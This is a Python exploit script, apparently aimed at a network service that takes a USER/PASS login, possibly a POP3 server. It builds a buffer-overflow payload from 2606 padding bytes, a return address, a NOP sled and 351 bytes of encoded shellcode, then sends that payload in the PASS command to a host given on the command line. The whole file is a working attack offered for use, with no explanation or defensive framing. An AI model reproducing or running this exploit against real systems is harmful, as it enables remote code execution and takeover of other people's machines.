#!/usr/bin/python

import socket
import sys

# 351 bytes

buf =  ""
buf += "\xdd\xc7\xd9\x74\x24\xf4\x58\xba\x1f\xc2\xaf\x72\x31"
buf += "\xc9\xb1\x52\x31\x50\x17\x83\xc0\x04\x03\x4f\xd1\x4d"
buf += "\x87\x93\x3d\x13\x68\x6b\xbe\x74\xe0\x8e\x8f\xb4\x96"
buf += "\xdb\xa0\x04\xdc\x89\x4c\xee\xb0\x39\xc6\x82\x1c\x4e"
buf += "\x6f\x28\x7b\x61\x70\x01\xbf\xe0\xf2\x58\xec\xc2\xcb"
buf += "\x92\xe1\x03\x0b\xce\x08\x51\xc4\x84\xbf\x45\x61\xd0"
buf += "\x03\xee\x39\xf4\x03\x13\x89\xf7\x22\x82\x81\xa1\xe4"
buf += "\x25\x45\xda\xac\x3d\x8a\xe7\x67\xb6\x78\x93\x79\x1e"
buf += "\xb1\x5c\xd5\x5f\x7d\xaf\x27\x98\xba\x50\x52\xd0\xb8"
buf += "\xed\x65\x27\xc2\x29\xe3\xb3\x64\xb9\x53\x1f\x94\x6e"
buf += "\x05\xd4\x9a\xdb\x41\xb2\xbe\xda\x86\xc9\xbb\x57\x29"
buf += "\x1d\x4a\x23\x0e\xb9\x16\xf7\x2f\x98\xf2\x56\x4f\xfa"
buf += "\x5c\x06\xf5\x71\x70\x53\x84\xd8\x1d\x90\xa5\xe2\xdd"
buf += "\xbe\xbe\x91\xef\x61\x15\x3d\x5c\xe9\xb3\xba\xa3\xc0"
buf += "\x04\x54\x5a\xeb\x74\x7d\x99\xbf\x24\x15\x08\xc0\xae"
buf += "\xe5\xb5\x15\x60\xb5\x19\xc6\xc1\x65\xda\xb6\xa9\x6f"
buf += "\xd5\xe9\xca\x90\x3f\x82\x61\x6b\xa8\x6d\xdd\x73\x4f"
buf += "\x06\x1c\x73\x8e\x6d\xa9\x95\xfa\x81\xfc\x0e\x93\x38"
buf += "\xa5\xc4\x02\xc4\x73\xa1\x05\x4e\x70\x56\xcb\xa7\xfd"
buf += "\x44\xbc\x47\x48\x36\x6b\x57\x66\x5e\xf7\xca\xed\x9e"
buf += "\x7e\xf7\xb9\xc9\xd7\xc9\xb3\x9f\xc5\x70\x6a\xbd\x17"
buf += "\xe4\x55\x05\xcc\xd5\x58\x84\x81\x62\x7f\x96\x5f\x6a"
buf += "\x3b\xc2\x0f\x3d\x95\xbc\xe9\x97\x57\x16\xa0\x44\x3e"
buf += "\xfe\x35\xa7\x81\x78\x3a\xe2\x77\x64\x8b\x5b\xce\x9b"
buf += "\x24\x0c\xc6\xe4\x58\xac\x29\x3f\xd9\xdc\x63\x1d\x48"
buf += "\x75\x2a\xf4\xc8\x18\xcd\x23\x0e\x25\x4e\xc1\xef\xd2"
buf += "\x4e\xa0\xea\x9f\xc8\x59\x87\xb0\xbc\x5d\x34\xb0\x94"

nop = "\x90" * (390-351)

def main():
	bytes = "A" * 2606 + "\x8f\x35\x4a\x5f" + nop + buf

	print("Fuzzing: " + str(len(bytes)))

	sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sck.connect((sys.argv[1], int(sys.argv[2])))

	sck.recv(1024)
	sck.send("USER teste\r\n")
	sck.recv(1024)
	sck.send("PASS " + bytes + "\r\n")
	sck.recv(1024)

try:
	main()
except Exception as e:
	print(str(e))